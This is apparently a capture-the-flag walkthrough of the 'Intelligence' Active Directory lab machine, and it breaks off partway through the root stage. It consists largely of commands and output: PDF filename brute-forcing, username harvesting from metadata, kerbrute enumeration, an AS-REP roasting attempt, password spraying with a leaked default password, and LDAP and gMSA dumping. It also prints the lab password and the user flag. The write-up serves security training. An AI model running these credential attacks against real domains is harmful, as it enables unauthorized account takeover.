# Intelligence

# Enumeration

```other
⛩\> nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open 10.129.95.154
Nmap scan report for 10.129.95.154
Host is up (0.24s latency).
Not shown: 65516 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-05 11:58:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
|_ssl-date: 2021-07-05T11:59:44+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
|_ssl-date: 2021-07-05T11:59:45+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
|_ssl-date: 2021-07-05T11:59:44+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
|_ssl-date: 2021-07-05T11:59:45+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-07-05T11:59:07
|_  start_date: N/A
```

Nmap reveals a lot of ports running on the machine, multiple LDAP ports, Kerberos, HTTP, SMB and couple others. We also have hostname and virtual host in the result. Add them to hosts file.

#### Web Enumeration

![Screen Shot 2021-07-06 at 22.36.04.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/D87DA9BF-EF1F-475E-8580-FDCFBAF01926/B548BFE1-7189-4F91-8E51-260C31B90A33_2/Screen%20Shot%202021-07-06%20at%2022.36.04.png)

There are two pdf files available to download. Inside both files there’s nothing interesting but if we read metadata then we’d find creators name.

```other
⛩\> ls *pdf
2020-01-01-upload.pdf  2020-12-15-upload.pdf

⛩\> exiftool *.pdf
======== 2020-01-01-upload.pdf
ExifTool Version Number         : 12.16
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 26 KiB
File Modification Date/Time     : 2021:07:07 05:38:11+00:00
File Access Date/Time           : 2021:07:07 05:38:11+00:00
File Inode Change Date/Time     : 2021:07:07 05:38:17+00:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
======== 2020-12-15-upload.pdf
ExifTool Version Number         : 12.16
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 KiB
File Modification Date/Time     : 2021:07:07 05:38:21+00:00
File Access Date/Time           : 2021:07:07 05:38:21+00:00
File Inode Change Date/Time     : 2021:07:07 05:38:26+00:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
    2 image files read
```

Create user list and include these creators name in it and query against domain to check these accounts are valid or not.

```other
⛩\> cat users
Jose.Williams
William.Lee

⛩\> ./kerbrute_linux_amd64 userenum users -d intelligence.htb --dc intelligence.htb

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 07/07/21 - Ronnie Flathers @ropnop

2021/07/07 05:44:46 >  Using KDC(s):
2021/07/07 05:44:46 >   intelligence.htb:88

2021/07/07 05:44:47 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2021/07/07 05:44:47 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2021/07/07 05:44:47 >  Done! Tested 2 usernames (2 valid) in 0.276 seconds
```

Both accounts are valid. Try to query the domain for users with 'Do not require Kerberos pre-authentication' set and export their TGTs for cracking.

```other
⛩\> GetNPUsers.py intelligence.htb/ -usersfile users
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Both accounts have not set to ‘Do not require pre-auth’. This means, we can't perform Kerberoasting attack, it requires a user with Pre-Authentication enabled. If we look at the naming of DPF files, you will see a pattern.

![Screen Shot 2021-07-06 at 23.48.23.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/D87DA9BF-EF1F-475E-8580-FDCFBAF01926/20553582-1133-4D70-88BD-48579D28ADDE_2/Screen%20Shot%202021-07-06%20at%2023.48.23.png)

PDF file naming system is just dates, we can generate list of dates and brute-force to find any other pdf files. As the filename suggests 2020-01-01, we generate from same date and end with 2022.

```other
⛩\> cat gen_date.sh
#!/bin/bash
start=2020-1-2
end=2022-01-01
while ! [[ $start > $end ]]; do
    echo $start
    start=$(date -d "$start + 1 day" +%F)
done

⛩\> bash gen_date.sh > dates.txt && cat dates.txt | while read line; do echo ${line}$string-upload.pdf; done > file_name.txt
```

The above shell file will generate dates from 2020 to 2022. Then we use the generated date to append ‘-upload.pdf’ to all dates and save it in a file called ‘file_name.txt’. Now we can brute-force to find the other PDF files.

```other
⛩\> ffuf -w file_name.txt -mc 200 -u http://intelligence.htb/documents/FUZZ -s -o output -of md
```

FUFF will help us to brute-force file names from given wordlist and we save it in md (markdown) format. Now we have to sort the output file for just link (urls).

```other
⛩\> awk '{print $4}' output > urls.txt

⛩\> wc -l urls.txt
105 urls.txt
```

All the links are inside urls.txt, around 105 PDF file links. We can access and download the files, for that we will use wget.

```other
⛩\> wget -i urls.txt -q

⛩\> ls
2020-01-04-upload.pdf  2020-04-15-upload.pdf  2020-06-22-upload.pdf  2020-09-13-upload.pdf  2020-12-28-upload.pdf
2020-01-10-upload.pdf  2020-04-23-upload.pdf  2020-06-25-upload.pdf  2020-09-16-upload.pdf  2020-12-30-upload.pdf
2020-01-20-upload.pdf  2020-05-01-upload.pdf  2020-06-26-upload.pdf  2020-09-22-upload.pdf  2021-01-03-upload.pdf
2020-01-22-upload.pdf  2020-05-03-upload.pdf  2020-06-28-upload.pdf  2020-09-27-upload.pdf  2021-01-14-upload.pdf
2020-01-23-upload.pdf  2020-05-07-upload.pdf  2020-06-30-upload.pdf  2020-09-29-upload.pdf  2021-01-25-upload.pdf
2020-01-25-upload.pdf  2020-05-11-upload.pdf  2020-07-02-upload.pdf  2020-09-30-upload.pdf  2021-01-30-upload.pdf
2020-01-30-upload.pdf  2020-05-17-upload.pdf  2020-07-06-upload.pdf  2020-10-05-upload.pdf  2021-02-10-upload.pdf
2020-02-11-upload.pdf  2020-05-20-upload.pdf  2020-07-08-upload.pdf  2020-10-19-upload.pdf  2021-02-13-upload.pdf
2020-02-17-upload.pdf  2020-05-21-upload.pdf  2020-07-20-upload.pdf  2020-11-01-upload.pdf  2021-02-21-upload.pdf
2020-02-23-upload.pdf  2020-05-24-upload.pdf  2020-07-24-upload.pdf  2020-11-03-upload.pdf  2021-02-25-upload.pdf
2020-02-24-upload.pdf  2020-05-29-upload.pdf  2020-08-01-upload.pdf  2020-11-06-upload.pdf  2021-03-01-upload.pdf
2020-02-28-upload.pdf  2020-06-02-upload.pdf  2020-08-03-upload.pdf  2020-11-10-upload.pdf  2021-03-07-upload.pdf
2020-03-04-upload.pdf  2020-06-03-upload.pdf  2020-08-09-upload.pdf  2020-11-11-upload.pdf  2021-03-10-upload.pdf
2020-03-05-upload.pdf  2020-06-04-upload.pdf  2020-08-19-upload.pdf  2020-11-13-upload.pdf  2021-03-18-upload.pdf
2020-03-12-upload.pdf  2020-06-07-upload.pdf  2020-08-20-upload.pdf  2020-11-24-upload.pdf  2021-03-21-upload.pdf
2020-03-13-upload.pdf  2020-06-08-upload.pdf  2020-09-02-upload.pdf  2020-11-30-upload.pdf  2021-03-25-upload.pdf
2020-03-17-upload.pdf  2020-06-12-upload.pdf  2020-09-04-upload.pdf  2020-12-10-upload.pdf  2021-03-27-upload.pdf
2020-03-21-upload.pdf  2020-06-14-upload.pdf  2020-09-05-upload.pdf  2020-12-15-upload.pdf
2020-04-02-upload.pdf  2020-06-15-upload.pdf  2020-09-06-upload.pdf  2020-12-20-upload.pdf
2020-04-04-upload.pdf  2020-06-21-upload.pdf  2020-09-11-upload.pdf  2020-12-24-upload.pdf
```

All the PDF files are here, now we have to do two things, go through all the files for any information and extract creators name and save them in file.

```other
⛩\> exiftool *.pdf | grep 'Creator' | awk '{print $3}' | sort -u > users.txt

⛩\> wc -l users.txt
30 users.txt
```

Now we have 30 creators name in the users file. We can cross check with domain using kerbrute application for valid accounts.

```other
⛩\> ./kerbrute_linux_amd64 userenum PDF/users.txt -d intelligence.htb --dc intelligence.htb

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 07/07/21 - Ronnie Flathers @ropnop

2021/07/07 07:26:16 >  Using KDC(s):
2021/07/07 07:26:16 >   intelligence.htb:88

2021/07/07 07:26:16 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2021/07/07 07:26:16 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2021/07/07 07:26:17 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2021/07/07 07:26:17 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2021/07/07 07:26:17 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2021/07/07 07:26:17 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2021/07/07 07:26:17 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2021/07/07 07:26:17 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2021/07/07 07:26:17 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2021/07/07 07:26:17 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2021/07/07 07:26:17 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2021/07/07 07:26:17 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2021/07/07 07:26:17 >  Done! Tested 30 usernames (30 valid) in 0.922 seconds
```

All 30 user accounts are valid. Query the domain for users with 'Do not require Kerberos pre-authentication' set and export their TGTs for cracking.

```other
⛩\> GetNPUsers.py intelligence.htb/ -usersfile users.txt
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User Anita.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Baker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Morris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Daniel.Shelton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Danny.Matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darryl.Harris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Mcbride doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ian.Duncan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Patterson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jennifer.Thomas doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jessica.Moody doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User John.Coleman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kaitlyn.Zimmerman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kelly.Long doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nicole.Brock doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Richard.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Samuel.Richardson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Scott.Scott doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Stephanie.Young doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Teresa.Williamson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Hall doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Valenzuela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tiffany.Molina doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Travis.Evans doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Not even one account is set for ‘do not require pre-auth’.

One of the PDF file has a password inside.

```other
⛩\> pdfgrep 'pass' *.pdf
2020-06-04-upload.pdf:Please login using your username and the default password of:
2020-06-04-upload.pdf:After logging in please change your password as soon as possible.
```

![Screen Shot 2021-10-21 at 01.47.15.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/D87DA9BF-EF1F-475E-8580-FDCFBAF01926/80AD6196-0774-4D07-86AC-03EA70ED2770_2/Screen%20Shot%202021-10-21%20at%2001.47.15.png)

There’s another file which has a update message.

![Screen Shot 2021-10-21 at 01.45.47.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/D87DA9BF-EF1F-475E-8580-FDCFBAF01926/7B6C5D9C-F258-4125-A3AF-5F9AC751919F_2/Screen%20Shot%202021-10-21%20at%2001.45.47.png)

It mentions about a script which is placed somewhere by ‘Ted’ user and they are in process of locking down the service accounts. We will look into this later.

Now we have a password and multiple usernames. We have to perform ‘password spraying’ attack on all users with this new found password.

```swift
⛩\> crackmapexec smb intelligence.htb -u PDF/users.txt -p 'NewIntelligenceCorpUser9876' --shares
SMB         10.129.95.154   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
SMB         10.129.95.154   445    DC               [+] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share
SMB         10.129.95.154   445    DC               Users           READ
```

We got the username for that password, we also got the shared folders for that user. Now we can access the shared resources.

```other
⛩\> smbclient \\\\intelligence.htb\\Users -U Tiffany.Molina
Enter WORKGROUP\Tiffany.Molina's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Mon Apr 19 01:20:26 2021
  ..                                 DR        0  Mon Apr 19 01:20:26 2021
  Administrator                       D        0  Mon Apr 19 00:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 07:21:46 2018
  Default                           DHR        0  Mon Apr 19 02:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 07:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 07:11:27 2018
  Public                             DR        0  Mon Apr 19 00:18:39 2021
  Ted.Graves                          D        0  Mon Apr 19 01:20:26 2021
  Tiffany.Molina                      D        0  Mon Apr 19 00:51:46 2021

                3770367 blocks of size 4096. 1456523 blocks available
```

In Tiffany’s directory we can find the user flag.

```other
smb: \Tiffany.Molina\Desktop\> more user.txt
90bc99873a235f812b5ce468bf527ae7
```

We have the user account password, let’s dump the domain related information via LDAP.

[GitHub - dirkjanm/ldapdomaindump: Active Directory information dumper via LDAP](https://github.com/dirkjanm/ldapdomaindump)

```other
⛩\> ldapdomaindump 10.10.10.248 -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -o ldap_dump
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

The domain dump is in the output directory. Let’s check it out.

```other
⛩\> ls -la
total 332
drwxr-xr-x 2 kali kali  4096 Oct 21 12:43 .
drwxr-xr-x 3 kali kali  4096 Oct 21 12:43 ..
-rw-r--r-- 1 kali kali  1887 Oct 21 12:43 domain_computers_by_os.html
-rw-r--r-- 1 kali kali   540 Oct 21 12:43 domain_computers.grep
-rw-r--r-- 1 kali kali  1583 Oct 21 12:43 domain_computers.html
-rw-r--r-- 1 kali kali 10074 Oct 21 12:43 domain_computers.json
-rw-r--r-- 1 kali kali 10528 Oct 21 12:43 domain_groups.grep
-rw-r--r-- 1 kali kali 17789 Oct 21 12:43 domain_groups.html
-rw-r--r-- 1 kali kali 83677 Oct 21 12:43 domain_groups.json
-rw-r--r-- 1 kali kali   251 Oct 21 12:43 domain_policy.grep
-rw-r--r-- 1 kali kali  1147 Oct 21 12:43 domain_policy.html
-rw-r--r-- 1 kali kali  5693 Oct 21 12:43 domain_policy.json
-rw-r--r-- 1 kali kali    71 Oct 21 12:43 domain_trusts.grep
-rw-r--r-- 1 kali kali   828 Oct 21 12:43 domain_trusts.html
-rw-r--r-- 1 kali kali     2 Oct 21 12:43 domain_trusts.json
-rw-r--r-- 1 kali kali 25494 Oct 21 12:43 domain_users_by_group.html
-rw-r--r-- 1 kali kali  9084 Oct 21 12:43 domain_users.grep
-rw-r--r-- 1 kali kali 21642 Oct 21 12:43 domain_users.html
-rw-r--r-- 1 kali kali 90155 Oct 21 12:43 domain_users.json
```

The output is in HTML, JSON & Grep.

![Screen Shot 2021-10-21 at 05.49.01.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/D87DA9BF-EF1F-475E-8580-FDCFBAF01926/A996E5D8-13DC-446F-85E8-1A09D6247E84_2/Screen%20Shot%202021-10-21%20at%2005.49.01.png)

I have opened the domain computers html file in browser. There are two domain computer accounts available. Interestingly, ‘svc_int’ computer account has a flag ‘trusted to auth for delegation’ set, this is a security-sensitive setting. We can impersonate other domain users and authenticate.

```other
⛩\> ./windapsearch-linux-amd64 -d intelligence.htb -u 'Tiffany.Molina@intelligence.htb' -m computers -p 'NewIntelligenceCorpUser9876'
dn: CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
cn: DC
operatingSystem: Windows Server 2019 Datacenter
operatingSystemVersion: 10.0 (17763)
dNSHostName: dc.intelligence.htb

dn: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
cn: svc_int
dNSHostName: svc_int.intelligence.htb
```

[GitHub - ropnop/go-windapsearch: Utility to enumerate users, groups and computers from a Windows domain through LDAP queries](https://github.com/ropnop/go-windapsearch)

Windapsearch gives us another interesting information, ‘svc_int’ is Managed Service Account. If we remember, one of the PDF file mentioned about locking down service account, so apparently they haven’t done it yet. If we can able to get hold of either password or hash of this service account, then we can easily impersonate administrator.

[GitHub - micahvandeusen/gMSADumper: Lists who can read any gMSA password blobs and parses them if the current user has access.](https://github.com/micahvandeusen/gMSADumper)

We can try this application to dump the service account password.

```other
⛩\> python3 gmsaDumper.py -d intelligence.htb -l 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
```

I tried to read the ‘svc_int’ password via previously found user creds, but it didn’t give us the password or hash. However, it gave us crucial information that, only ‘DC$’ and ‘itsupport’ can read the password. We are not sure ‘Tiffany’ belongs to what group. We have already dumped the user information via LDAP using ‘ldapdomaindump’ application, let’s find which user is in ‘IT Support’ group.

```other
⛩\> less domain_users.grep | grep -i support
Ted Graves      Ted Graves      Ted.Graves      IT Support      Domain Users    04/19/21 00:49:42       10/21/21 13:46:33       10/21/21 17:06:33       NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD     04/19/21 00:49:42       S-1-5-21-4210132550-3389855604-3437519686-1140
Laura Lee       Laura Lee       Laura.Lee       IT Support      Domain Users    04/19/21 00:49:41       04/19/21 00:49:41       01/01/01 00:00:00       NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD     04/19/21 00:49:41       S-1-5-21-4210132550-3389855604-3437519686-1139
```

We have two user accounts, who are in the ‘IT Support’ group. We don’t have credentials for either of these accounts.

# Root Flag

Let’s keep looking into SMB directory.

```other
⛩\> smbclient -L \\\\intelligence.htb -U Tiffany.Molina
Enter WORKGROUP\Tiffany.Molina's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
        Users           Disk
SMB1 disabled -- no workgroup available
```

We do have a IT directory in the SMB share. Let’s look into that.

```other
